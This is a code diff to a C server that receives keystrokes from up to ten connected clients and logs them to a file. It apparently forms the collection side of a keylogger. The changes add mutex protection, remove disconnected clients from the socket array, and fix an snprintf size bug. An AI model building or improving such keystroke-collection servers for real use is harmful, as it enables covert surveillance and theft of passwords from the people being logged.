@@ -21,14 +21,11 @@
 #define MAX_CLIENTS 10
 int server_sock; 
 
-// Integer array to store connected client's socket.
-int client_sockets[MAX_CLIENTS];
-
 // Mutual Exclusive Lock for shared file descriptor.
 pthread_mutex_t mutexFD = PTHREAD_MUTEX_INITIALIZER;
 
-// Shared file descriptor for logging keystrokes and number of clients online.
-int file_D, numOfClients;
+// Shared: file descriptor for logging keystrokes, number of clients online and array to store connected client's socket.
+int file_D, numOfClients, client_sockets[MAX_CLIENTS];
 
 // Struct to store client.
 typedef struct
@@ -133,7 +130,9 @@ int main(int argc, char *argv[])
         printf("[+] New Client Online: FD %d [%s:%d]\n", client_sock, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 
         // Store connected client's socket in the client_sockets array.
+        pthread_mutex_lock(&mutexFD);
         client_sockets[numOfClients] = client_sock;
+        pthread_mutex_unlock(&mutexFD);
 
         // Increment number of clients online.
         pthread_mutex_lock(&mutexFD);
@@ -206,6 +205,18 @@ void *handle_client(void *args)
             numOfClients -= 1;
             pthread_mutex_unlock(&mutexFD);
 
+            // Remove client_sock for the client_sockets[] array.
+            pthread_mutex_lock(&mutexFD);
+            for (int i = 0; i < MAX_CLIENTS; i++)
+            {
+                if (client_sockets[i] == client->client_socket) 
+                {
+                    client_sockets[i] = 0;
+                    break;
+                }
+            }
+            pthread_mutex_unlock(&mutexFD);
+
             // Clean up resources.
             close(client->client_socket);
             free(client);
@@ -220,6 +231,18 @@ void *handle_client(void *args)
             numOfClients -= 1;
             pthread_mutex_unlock(&mutexFD);
 
+            // Remove client_sock for the client_sockets[] array.
+            pthread_mutex_lock(&mutexFD);
+            for (int i = 0; i < MAX_CLIENTS; i++)
+            {
+                if (client_sockets[i] == client->client_socket) 
+                {
+                    client_sockets[i] = 0;
+                    break;
+                }
+            }
+            pthread_mutex_unlock(&mutexFD);
+            
             // Clean up resources.
             close(client->client_socket);
             free(client);
@@ -229,7 +252,7 @@ void *handle_client(void *args)
         buffer[bytes_received] = '\0';
 
         // Format the client keystrokes for logging.
-        int written = snprintf(keystrokes, sizeof(buffer), "[Client %d] %s [LOGGED]\n", client->client_socket, buffer);
+        int written = snprintf(keystrokes, sizeof(keystrokes), "[Client %d] %s [LOGGED]\n", client->client_socket, buffer);
 
         pthread_mutex_lock(&mutexFD);
         write(file_D, keystrokes, written);
